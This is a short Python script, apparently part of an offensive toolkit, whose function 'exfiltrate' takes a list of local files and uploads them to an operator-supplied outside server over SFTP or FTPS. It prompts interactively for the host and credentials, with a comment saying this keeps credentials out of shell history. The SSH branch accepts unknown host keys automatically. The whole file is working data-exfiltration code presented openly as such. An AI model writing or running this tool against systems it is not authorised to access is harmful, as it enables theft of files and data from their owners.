
import os,sys
import ftplib
from ftplib import FTP_TLS
import paramiko
from pathlib import Path

def exfiltrate(input_files):
        #used input to prevent credentials being captured by History probaly overkill
        host = input("[?] Enter Host of ssh/ftp server? ")
        username = input("[?] Enter Username? ")
        password = input("[?] Enter Password? ")
        port = input("[?] Enter Port? ")
        
        method = input("[?] Select exfiltration method: FTPS/SSH? ") #select FTPS or SSH method to send files over encrypted communications
        if method.upper() == "SSH":
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host,port,username,password,timeout=10)
                for f in input_files: #loop through input files
                    file_exist = Path(f) #checks to see if file exists then uploads it
                    if file_exist.is_file():
                            sftp = ssh.open_sftp()
                            write_path = '/home/' + username + '/' + f
                            send_file = f
                            sftp.put(send_file,write_path)
                            print("[+] " + f + " sent to SSH server")
                    else:
                        print("[!] " + f + " File not found")
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("[!] No valid host")
            except FileNotFoundError:
                print("[!] Write path " + write_path + " not found")
                print("[!] Upload failed")
            except paramiko.ssh_exception.AuthenticationException:
                print("[!] Authentication failed")
            except OSError:
                print("[!] Timeout did not get connection from server or incorrect port")
                
        elif method.upper() == "FTPS":
            try:
                ftps = FTP_TLS() #initiate TLS connection
                print("[*] Initializing TLS connection")
                print("[*] Connecting to " + host)
                ftps.connect(host=host,port=int(port),timeout=10)
                result = ftps.login(user=username,passwd=password) #login to FTP server 
                ftps.prot_p() #encrypt data sent to server
                if '230' in result:
                    print("[+] Login Successful")
                    for f in input_files: #loop through input files
                        file_exist = Path(f) #checks to see if file exists then uploads it
                        if file_exist.is_file():
                            with open(f,'rb') as file:
                                    ftps.storbinary(f"STOR {f}",file) #upload file
                                    print("[+] " + f + " successfuly uploaded")
                        else:
                            print("[!] " + f + " File not found")
            except OSError:
                print("[!] Can't connect to host")
            except ftplib.error_perm: #if connecting to an unencrypted server you'll get a login failed
                print('[!] Login Failed')
